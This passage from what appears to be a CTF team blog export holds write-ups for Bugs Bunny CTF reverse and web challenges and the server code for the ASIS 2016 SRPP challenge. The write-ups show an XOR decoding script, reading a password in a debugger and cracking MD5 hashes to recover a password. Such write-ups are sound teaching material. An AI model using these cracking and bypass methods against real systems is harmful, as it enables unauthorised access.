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it2sWbMwevTojN3GiBEjwpQpU8Kzzz5rg0OejEvIt84YPHhwGDFiREbWfY9+DWBDBV2XY445Jrz88su1rpzP3q2+Y2jUqFHh97//fUZvq7q6OkyfPj389a9/DXPmzAnLli0LGzduDJWVlR4BhCYal9AUnVFUVBRKSkpCq1atQseOHUOfPn3CueeeGy688MJQXJyZV+8JwP9Od9FFF4Xx48eHfffdN28OlPr+6qVpj6EePXqEf/7zn8lHd7H33Ykbm4U/Lu1zY2dP7IzG2KOfAp4/f36YMWNGePXVV8PixYvD6tWrw6pVq0JVVVUoKysLXbt2DSeddFL4zne+E3r37u1elXo1a9YsdOzYMQwdOjTceuut4g+MSyjoznAZGH8pgbFpbNrn9rntuLftOwEIALB3cR1AAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEABAANoEAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAACy5v8BjDWwa4oYZqgAAAAASUVORK5CYII=\"fh = open(\"flag.png\", \"wb\")fh.write(base64.b64decode(strings))fh.close() And now the flag","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"base64","slug":"base64","permalink":"https://teamrocketist.github.io/tags/base64/"}]},{"title":"[Reverse] Bugs Bunny CTF - Rev100","slug":"Reverse-Bugs-Bunny-CTF-Rev100","date":"2017-07-31T15:14:17.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/","link":"","permalink":"https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/","excerpt":"","text":"Find me faster !Author: Aymen Borgirev100.zipStarting to open our executable file on IDA:There is some weird shit going around but we can see a function i_am_debugged() which leads you to exit the program if you running the program on a debugger like gdb or even IDA, there is alot of calls as you can see in the assembly code I could run the debugger and change those registers to not jump out of the program but since there was alot of calls I chose to do it in another way.After a while I found this “loop” in the assembly code we can see they are just xoring two strange strings, variable “a” and variable “b” and then saving it on variable “c”.Now we just need to find those “a” and “b” initial values and convert this assembly into python.Finding “a” and “b” values is easy we can use IDA to do that:Now we just write a python script equivalent to this assembly (Notice that wrote the strings in python as hex bytes because some characters weren’t pritable): 12345678910a = '\\x61\\x41\\x40\\x37\\x6d\\x77\\x34\\x2c\\x5f\\x41\\x42\\x60\\x07\\x34\\x7d\\x12\\x57\\x7a\\x22\\x25\\x4f\\x28'b = '\\x23\\x34\\x27\\x44\\x32\\x35\\x41\\x42\\x31\\x38\\x39\\x38\\x37\\x46\\x22\\x23\\x24\\x25\\x44\\x50\\x21\\x55' c = ''v4 = len(a) + 1v5 = len(b) + 1for i in range(0, v4-1): c += chr(ord(a[i])^ord(b[i])) print cprint c Running the script: 123kinyabitch@Debian ~/D/H/ctf&gt; python rev100.py Bugs_Bunny&#123;X0r_1s_fun&#125;","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"xor","slug":"xor","permalink":"https://teamrocketist.github.io/tags/xor/"},{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"}]},{"title":"[Reverse] - Bugs Bunny CTF - Rev 50","slug":"Reverse-Bugs-Bunny-CTF-Rev-50","date":"2017-07-31T14:16:03.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/","link":"","permalink":"https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/","excerpt":"","text":"only guess50Reverse Engineering … ooh no need !put the right password between Bugs_Bunny{…}Author: Aymen Borgi Starting by Executing the file: 123kinyabitch@Debian ~/D/H/ctf&gt; rev50/rev50usage ./rev50 password Using the ida pro to check all the strings in the program we can see there were alot of them so we can’t really guess which one is it without analysing the program itself Checking out the main function with ida pro we can see: We now can see where our program is checking if the flag is correct if we manage to check value of the register RAX register before that strcmp ocurrs. I could use IDA to check those values but since is alot of trouble to do remote execute the file in a linux machine (I was executing ida in a windows VM machine) to not loose time I rather preferred to check the value on GDB: Disassembling the main functionIdentify the address and do a break point and checking the value on the register RAXRerunning the program with the password “mercedes”Finally our flag is BugsBunny{mercedes}","categories":[{"name":"Reverse","slug":"Reverse","permalink":"https://teamrocketist.github.io/categories/Reverse/"}],"tags":[{"name":"reverse","slug":"reverse","permalink":"https://teamrocketist.github.io/tags/reverse/"},{"name":"gdb","slug":"gdb","permalink":"https://teamrocketist.github.io/tags/gdb/"}]},{"title":"[Web] Bugs Bunny Ctf - Web 100","slug":"Web-Bugs-Bunny-Ctf-Web-100","date":"2017-07-31T10:50:11.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2017/07/31/Web-Bugs-Bunny-Ctf-Web-100/","link":"","permalink":"https://teamrocketist.github.io/2017/07/31/Web-Bugs-Bunny-Ctf-Web-100/","excerpt":"","text":"Web100100My secure system is secure even you have my codehttp://52.53.151.123/web/web100.html This one was fairly easy the first thing that showed up on the web page was a http auth which was asking for a password my first thought was to bruteforce the password but first I checked up the website executing the command curl with bash: 12curl 'http://52.53.151.123/web/web100.html' And then showed up some javascript code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210var generate = function(string) &#123; function RT(lValue, iShiftBits) &#123; return (lValue &lt;&lt; iShiftBits) | (lValue &gt;&gt;&gt; (32 - iShiftBits)); &#125; function AU(lX, lY) &#123; var lX4, lY4, lX8, lY8, lResult; lX8 = (lX &amp; 0x80000000); lY8 = (lY &amp; 0x80000000); lX4 = (lX &amp; 0x40000000); lY4 = (lY &amp; 0x40000000); lResult = (lX &amp; 0x3FFFFFFF) + (lY &amp; 0x3FFFFFFF); if (lX4 &amp; lY4) &#123; return (lResult ^ 0x80000000 ^ lX8 ^ lY8); &#125; if (lX4 | lY4) &#123; if (lResult &amp; 0x40000000) &#123; return (lResult ^ 0xC0000000 ^ lX8 ^ lY8); &#125; else &#123; return (lResult ^ 0x40000000 ^ lX8 ^ lY8); &#125; &#125; else &#123; return (lResult ^ lX8 ^ lY8); &#125; &#125; function F(x, y, z) &#123; return (x &amp; y) | ((~x) &amp; z); &#125; function G(x, y, z) &#123; return (x &amp; z) | (y &amp; (~z)); &#125; function H(x, y, z) &#123; return (x ^ y ^ z); &#125; function I(x, y, z) &#123; return (y ^ (x | (~z))); &#125; function FF(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(F(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function GG(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(G(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function HH(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(H(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function II(a, b, c, d, x, s, ac) &#123; a = AU(a, AU(AU(I(b, c, d), x), ac)); return AU(RT(a, s), b); &#125;; function CTWA(bytes) &#123; var lWordCount; var lMessageLength = bytes.length; var lNumberOfWords_temp1 = lMessageLength + 8; var lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64; var lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16; var lWordArray = Array(lNumberOfWords - 1); var lBytePosition = 0; var lByteCount = 0; while (lByteCount &lt; lMessageLength) &#123; lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = (lWordArray[lWordCount] | (bytes[lByteCount] &lt;&lt; lBytePosition)); lByteCount++; &#125; lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 &lt;&lt; lBytePosition); lWordArray[lNumberOfWords - 2] = lMessageLength &lt;&lt; 3; lWordArray[lNumberOfWords - 1] = lMessageLength &gt;&gt;&gt; 29; return lWordArray; &#125;; function WordToHex(lValue) &#123; var WordToHexValue = \"\", WordToHexValue_temp = \"\", lByte, lCount; for (lCount = 0; lCount &lt;= 3; lCount++) &#123; lByte = (lValue &gt;&gt;&gt; (lCount * 8)) &amp; 255; WordToHexValue_temp = \"0\" + lByte.toString(16); WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - 2, 2); &#125; return WordToHexValue; &#125;; function Utf8Encode(string) &#123; string = string.replace(/\\r\\n/g, \"\\n\"); var result = Array(); for (var n = 0; n &lt; string.length; n++) &#123; var c = string.charCodeAt(n); if (c &lt; 128) &#123; result.push(c); &#125; else if ((c &gt; 127) &amp;&amp; (c &lt; 2048)) &#123; result.push((c &gt;&gt; 6) | 192); result.push((c &amp; 63) | 128); &#125; else &#123; result.push((c &gt;&gt; 12) | 224); result.push(((c &gt;&gt; 6) &amp; 63) | 128); result.push((c &amp; 63) | 128); &#125; &#125; return result; &#125;; var x = Array(); var k, AA, BB, CC, DD, a, b, c, d; var S11 = 7, S12 = 12, S13 = 17, S14 = 22; var S21 = 5, S22 = 9, S23 = 14, S24 = 20; var S31 = 4, S32 = 11, S33 = 16, S34 = 23; var S41 = 6, S42 = 10, S43 = 15, S44 = 21; var bytes = Utf8Encode(string); x = CTWA(bytes); a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476; for (k = 0; k &lt; x.length; k += 16) &#123; AA = a; BB = b; CC = c; DD = d; a = FF(a, b, c, d, x[k + 0], S11, 0xD76AA478); d = FF(d, a, b, c, x[k + 1], S12, 0xE8C7B756); c = FF(c, d, a, b, x[k + 2], S13, 0x242070DB); b = FF(b, c, d, a, x[k + 3], S14, 0xC1BDCEEE); a = FF(a, b, c, d, x[k + 4], S11, 0xF57C0FAF); d = FF(d, a, b, c, x[k + 5], S12, 0x4787C62A); c = FF(c, d, a, b, x[k + 6], S13, 0xA8304613); b = FF(b, c, d, a, x[k + 7], S14, 0xFD469501); a = FF(a, b, c, d, x[k + 8], S11, 0x698098D8); d = FF(d, a, b, c, x[k + 9], S12, 0x8B44F7AF); c = FF(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1); b = FF(b, c, d, a, x[k + 11], S14, 0x895CD7BE); a = FF(a, b, c, d, x[k + 12], S11, 0x6B901122); d = FF(d, a, b, c, x[k + 13], S12, 0xFD987193); c = FF(c, d, a, b, x[k + 14], S13, 0xA679438E); b = FF(b, c, d, a, x[k + 15], S14, 0x49B40821); a = GG(a, b, c, d, x[k + 1], S21, 0xF61E2562); d = GG(d, a, b, c, x[k + 6], S22, 0xC040B340); c = GG(c, d, a, b, x[k + 11], S23, 0x265E5A51); b = GG(b, c, d, a, x[k + 0], S24, 0xE9B6C7AA); a = GG(a, b, c, d, x[k + 5], S21, 0xD62F105D); d = GG(d, a, b, c, x[k + 10], S22, 0x2441453); c = GG(c, d, a, b, x[k + 15], S23, 0xD8A1E681); b = GG(b, c, d, a, x[k + 4], S24, 0xE7D3FBC8); a = GG(a, b, c, d, x[k + 9], S21, 0x21E1CDE6); d = GG(d, a, b, c, x[k + 14], S22, 0xC33707D6); c = GG(c, d, a, b, x[k + 3], S23, 0xF4D50D87); b = GG(b, c, d, a, x[k + 8], S24, 0x455A14ED); a = GG(a, b, c, d, x[k + 13], S21, 0xA9E3E905); d = GG(d, a, b, c, x[k + 2], S22, 0xFCEFA3F8); c = GG(c, d, a, b, x[k + 7], S23, 0x676F02D9); b = GG(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A); a = HH(a, b, c, d, x[k + 5], S31, 0xFFFA3942); d = HH(d, a, b, c, x[k + 8], S32, 0x8771F681); c = HH(c, d, a, b, x[k + 11], S33, 0x6D9D6122); b = HH(b, c, d, a, x[k + 14], S34, 0xFDE5380C); a = HH(a, b, c, d, x[k + 1], S31, 0xA4BEEA44); d = HH(d, a, b, c, x[k + 4], S32, 0x4BDECFA9); c = HH(c, d, a, b, x[k + 7], S33, 0xF6BB4B60); b = HH(b, c, d, a, x[k + 10], S34, 0xBEBFBC70); a = HH(a, b, c, d, x[k + 13], S31, 0x289B7EC6); d = HH(d, a, b, c, x[k + 0], S32, 0xEAA127FA); c = HH(c, d, a, b, x[k + 3], S33, 0xD4EF3085); b = HH(b, c, d, a, x[k + 6], S34, 0x4881D05); a = HH(a, b, c, d, x[k + 9], S31, 0xD9D4D039); d = HH(d, a, b, c, x[k + 12], S32, 0xE6DB99E5); c = HH(c, d, a, b, x[k + 15], S33, 0x1FA27CF8); b = HH(b, c, d, a, x[k + 2], S34, 0xC4AC5665); a = II(a, b, c, d, x[k + 0], S41, 0xF4292244); d = II(d, a, b, c, x[k + 7], S42, 0x432AFF97); c = II(c, d, a, b, x[k + 14], S43, 0xAB9423A7); b = II(b, c, d, a, x[k + 5], S44, 0xFC93A039); a = II(a, b, c, d, x[k + 12], S41, 0x655B59C3); d = II(d, a, b, c, x[k + 3], S42, 0x8F0CCC92); c = II(c, d, a, b, x[k + 10], S43, 0xFFEFF47D); b = II(b, c, d, a, x[k + 1], S44, 0x85845DD1); a = II(a, b, c, d, x[k + 8], S41, 0x6FA87E4F); d = II(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0); c = II(c, d, a, b, x[k + 6], S43, 0xA3014314); b = II(b, c, d, a, x[k + 13], S44, 0x4E0811A1); a = II(a, b, c, d, x[k + 4], S41, 0xF7537E82); d = II(d, a, b, c, x[k + 11], S42, 0xBD3AF235); c = II(c, d, a, b, x[k + 2], S43, 0x2AD7D2BB); b = II(b, c, d, a, x[k + 9], S44, 0xEB86D391); a = AU(a, AA); b = AU(b, BB); c = AU(c, CC); d = AU(d, DD); &#125; var temp = WordToHex(a) + WordToHex(b) + WordToHex(c) + WordToHex(d); return temp.toLowerCase();&#125;__seceret = '622b010e27e3f82d0f4e2e69a3785a395767c7a39599aea7114553448239eb41cab90bfecd4a8a0881d0a8128f27c483';var _=__=___='';for (var i = 0; i &lt; __seceret.length; i+=3) &#123; _+=__seceret[i+0]; __+=__seceret[i+1]; ___+=__seceret[i+2];&#125;var h = prompt(\"Please enter your passowrd\");if(generate(h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13]) == _ &amp;&amp; generate(h[15]+h[10]+h[3]+h[5]+h[6]) ==__ &amp;&amp; generate(h[16]+h[12]+h[14]+h[2]+h[7])==___)&#123; alert('your flag is Bugs_Bunny&#123;'+h+'&#125;');&#125;else&#123; alert('I\\'m sorry my son it\\' not easy');&#125; I’ve seen this before and realized this was almost the same challenge it happened in trend micro ctf about 1 year ago, which for coincidence did a write up for it! you can check it up here https://kinyabitch.wordpress.com/2016/07/31/ctf/.Doing a fast analysis to the code we can see that the “generate function” is actually an known hash function which you could quickly find it by just searching it on google to identify it as md5 and find it in places like this https://gist.github.com/nduphuong/752463 1234567891011121314__seceret = '622b010e27e3f82d0f4e2e69a3785a395767c7a39599aea7114553448239eb41cab90bfecd4a8a0881d0a8128f27c483';var _=__=___='';for (var i = 0; i &lt; __seceret.length; i+=3) &#123; _+=__seceret[i+0]; __+=__seceret[i+1]; ___+=__seceret[i+2];&#125;var h = prompt(\"Please enter your passowrd\");if(generate(h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13]) == _ &amp;&amp; generate(h[15]+h[10]+h[3]+h[5]+h[6]) ==__ &amp;&amp; generate(h[16]+h[12]+h[14]+h[2]+h[7])==___)&#123; alert('your flag is Bugs_Bunny&#123;'+h+'&#125;');&#125;else&#123; alert('I\\'m sorry my son it\\' not easy');&#125; Now analysing the rest of the code we can see that variable seceret is splited into 3 variables “_”, ““ and “___”. If you ran this code on your browser you could easily find the values of these 3 variables instead of doing the calculations: 1234_ = 6b07fd4ea837c39e1542e1bbca01a224 __ = 20ee80e63596799a1543bc9fd88d8878 ___ = 21232f297a57a5a743894a0e4a801fc3 This are obviously md5 hashes now cracking them(john the ripper, hashcat or even searching the hashes on google) will get: 12346b07fd4ea837c39e1542e1bbca01a224 -&gt; tunisia20ee80e63596799a1543bc9fd88d8878 -&gt; bunny21232f297a57a5a743894a0e4a801fc3 -&gt; admin 123456if(generate(h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13]) == _ &amp;&amp; generate(h[15]+h[10]+h[3]+h[5]+h[6]) ==__ &amp;&amp; generate(h[16]+h[12]+h[14]+h[2]+h[7])==___)&#123; alert('your flag is Bugs_Bunny&#123;'+h+'&#125;');&#125;else&#123; alert('I\\'m sorry my son it\\' not easy');&#125; Analysing the password verification we can see that the that instruction to be true we will need those strings concatenation be our cracked hashes: 1234h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13] = 't'+'u'+'n'+'i'+'s'+'i'+'a';h[15]+h[10]+h[3]+h[5]+h[6] = 'b'+'u'+'n'+'n'+'y';h[16]+h[12]+h[14]+h[2]+h[7] = 'a'+'d'+'m'+'i'+'n'; Now reordering the string from the index 0 to 16 we get “inininynusutdamba”. We can conclude that is the password to be entered into the prompt, after submitting it the flag showed up at the webpage.","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"bruteforce","slug":"bruteforce","permalink":"https://teamrocketist.github.io/tags/bruteforce/"},{"name":"md5","slug":"md5","permalink":"https://teamrocketist.github.io/tags/md5/"}]},{"title":"[Crypto] ASIS CTF Finals 2016 - SRPP [Secure Remote Password Protocol]","slug":"Crypto-ASIS-CTF-Finals-2016-SRPP-Secure-Remote-Password-Protocol","date":"2016-09-14T03:12:59.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2016/09/14/Crypto-ASIS-CTF-Finals-2016-SRPP-Secure-Remote-Password-Protocol/","link":"","permalink":"https://teamrocketist.github.io/2016/09/14/Crypto-ASIS-CTF-Finals-2016-SRPP-Secure-Remote-Password-Protocol/","excerpt":"","text":"Average: 2.83Rating Count: 12You Rated: Not ratedPoints231Solves35CategoryCryptoDescription Try to crack our super safe cryptography system and find the flag. nc srpp.asis-ctf.ir 22778http://asis-ctf.ir/tasks/srpp.txz_baa9ec300fd3488a8417fc849a07c2aaf5a26224 Server.py (given by the challenge) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126#!/usr/bin/python# -*- coding: UTF-8 -*-import socketimport time from hashlib import *from thread import *from Crypto.Util.number import *from os import urandomfrom random import *from string import *from secret import password, flag_port = int(sys.argv[1])_timeout = 3 _host = ''_bufsize = 4096_logfile = open(str(sys.argv[0]) + '.log', 'a')_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)_socket.bind((_host, _port))_socket.listen(_bufsize)_taskname = 'SRPP'_hash = 'sha512'def Hash(*args): a = ':'.join(str(a) for a in args) return int(sha256(a).hexdigest(), 16)def getParams(nbit): N = getPrime(nbit) g = 2 k = Hash(N, g) return(N, g, k)def clientThread(client): client.send('Bot detection: Are you ready?' + '\\n') A = ''.join([choice(printable[:62]) for x in range(26)]) print A[:4] msg = 'ASIS needs proof of work to start the ' + _taskname + ' challenge.\\n' + _hash.upper() + '(X + \"%s\").hexdigest() = \"%s...\",\\nX is an alphanumeric string and |X| = 4\\nEnter X: ' % (A[4:], sha512(A).hexdigest()[:32]) client.send(msg) X = client.recv(_bufsize).strip() if sha256(X + A[4:]).hexdigest() == sha256(A).hexdigest(): client.settimeout(_timeout) client.send('Good work, Let\\'s Go!' + '\\n') nbit = 1024 params = getParams(nbit) N, g, k = params email = 'admin@asis-ctf.ir' client.send('Please login as \"admin@asis-ctf.ir\" and get the flag:' + '\\n') client.send('Sever is generating the parameters ...' + '\\n') client.send('params = (N, g, k) = ' + str(params) + '\\n') salt = urandom(32) N, g, _ = params x = Hash(salt, email, password) verifier = pow(g, x, N) while True: try: client.send('Send the email address and the public random positive value A seperated by \",\" as \"email, A\": ' + '\\n') ans = client.recv(_bufsize).strip() print ans try: email, A = ans.split(',') A = int(A) assert (A != 0 and A != N), client.send('Are you kidding me?! :P' + '\\n') assert email == 'admin@asis-ctf.ir', client.send('You should login as admin@asis-ctf.ir' + '\\n') b = getRandomRange(1, N) B = (k * verifier + pow(g, b, N)) % N client.send('(salt, public_ephemeral) = (%s, %d) \\n' % (salt.encode('base64')[:-1], B)) print gmpy.invert(B) u = Hash(A, B) client.send('Send the session key: ' + '\\n') K_client = client.recv(_bufsize).strip() assert K_client.isdigit(), client.send('Please send a valid positive integer as session key.' + '\\n') K_client = int(K_client) S_s = pow(A * pow(verifier, u, N), b, N) K_server = Hash(S_s) client.send('Send a POC of session key: ' + '\\n') M_client = client.recv(_bufsize).strip() assert M_client.isdigit(), client.send('Please send valid positive integer as POC.' + '\\n') M_client = int(M_client) assert (K_server == K_client), client.send('The session key is not correct!' + '\\n') assert (M_client == Hash(Hash(N) ^ Hash(g), Hash(email), salt, A, B, K_client)), client.send('The POC is not correct!' + '\\n') M_server = Hash(A, M_client, K_server) # TODO: check server POC in clinet side client.send('Great, you got the flag: ' + flag + '\\n') client.close() break except: client.send('Provided input is not valid.' + '\\n') client.send('Quiting ...' + '\\n') client.close() break except socket.timeout: 